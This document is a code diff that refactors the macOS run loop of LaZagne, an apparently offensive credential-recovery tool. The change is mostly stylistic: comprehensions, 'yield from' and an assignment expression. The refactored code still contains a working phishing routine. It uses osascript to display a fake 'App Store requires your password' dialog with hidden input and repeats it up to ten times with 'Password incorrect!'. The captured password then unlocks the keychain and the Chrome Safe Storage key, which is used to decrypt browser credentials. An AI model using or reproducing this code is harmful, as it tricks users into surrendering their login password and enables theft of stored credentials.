@@ -14,12 +14,7 @@ def create_module_dic():
     if constant.modules_dic:
         return constant.modules_dic
 
-    modules = {}
-
-    # Define a dictionary for all modules
-    for category in get_categories():
-        modules[category] = {}
-
+    modules = {category: {} for category in get_categories()}
     # Add all modules to the dictionary
     for m in get_modules():
         modules[m.category][m.options['dest']] = m
@@ -42,23 +37,16 @@ def get_safe_storage_key(key):
 def run_cmd(cmd):
     p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     result, _ = p.communicate()
-    if result:
-        return result
-    else:
-        return ''
+    return result if result else ''
 
 
 def run_module(module, subcategories):
     """
     Run only one module
     """
-    modules_to_launch = []
-
-    # Launch only a specific module
-    for i in subcategories:
-        if subcategories[i] and i in module:
-            modules_to_launch.append(i)
-
+    modules_to_launch = [
+        i for i in subcategories if subcategories[i] and i in module
+    ]
     # Launch all modules
     if not modules_to_launch:
         modules_to_launch = module
@@ -84,8 +72,7 @@ def run_modules(category_selected, subcategories):
     modules = create_module_dic()
     categories = [category_selected] if category_selected != 'all' else get_categories()
     for category in categories:
-        for r in run_module(modules[category], subcategories):
-            yield r
+        yield from run_module(modules[category], subcategories)
 
 
 def run_lazagne(category_selected='all', subcategories={}, password=None, interactive=False):
@@ -107,30 +94,25 @@ def run_lazagne(category_selected='all', subcategories={}, password=None, intera
     i = 0
     while True:
         # Run all modules
-        for r in run_modules(category_selected, subcategories):
-            yield r
-
-        # Execute once if not interactive,
-        # Otherwise print the dialog box until the user keychain is unlocked (so the user password has been found)
-        if not interactive or (interactive and constant.user_keychain_find):
+        yield from run_modules(category_selected, subcategories)
+        if not interactive or constant.user_keychain_find:
             break
 
-        elif interactive and not constant.user_keychain_find:
-            msg = ''
-            if i == 0:
-                msg = 'App Store requires your password to continue.'
-            else:
-                msg = 'Password incorrect! Please try again.'
-
-            # Code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
-            cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" ' \
-                  'to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & ' \
-                  'return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(
-                    application=application, msg=msg
-            )
-            pwd = run_cmd(cmd)
-            if pwd.split(':')[1].startswith('OK'):
-                constant.user_password = pwd.split(':')[2].strip()
+        msg = ''
+        msg = (
+            'App Store requires your password to continue.'
+            if i == 0
+            else 'Password incorrect! Please try again.'
+        )
+        # Code inspired from: https://github.com/fuzzynop/FiveOnceInYourLife
+        cmd = 'osascript -e \'tell app "{application}" to activate\' -e \'tell app "{application}" ' \
+              'to activate\' -e \'tell app "{application}" to display dialog "{msg}" & return & ' \
+              'return  default answer "" with icon 1 with hidden answer with title "{application} Alert"\''.format(
+                application=application, msg=msg
+        )
+        pwd = run_cmd(cmd)
+        if pwd.split(':')[1].startswith('OK'):
+            constant.user_password = pwd.split(':')[2].strip()
 
         i += 1
 
@@ -138,10 +120,8 @@ def run_lazagne(category_selected='all', subcategories={}, password=None, intera
         if i > 10:
             break
 
-    # If keychains has been decrypted, launch again some module
-    chrome_key = get_safe_storage_key('Chrome Safe Storage')
-    if chrome_key:
-        for r in run_module({'chrome': Chrome(safe_storage_key=chrome_key)}, subcategories):
-            yield r
-
+    if chrome_key := get_safe_storage_key('Chrome Safe Storage'):
+        yield from run_module(
+            {'chrome': Chrome(safe_storage_key=chrome_key)}, subcategories
+        )
     constant.stdout_result.append(constant.finalResults)
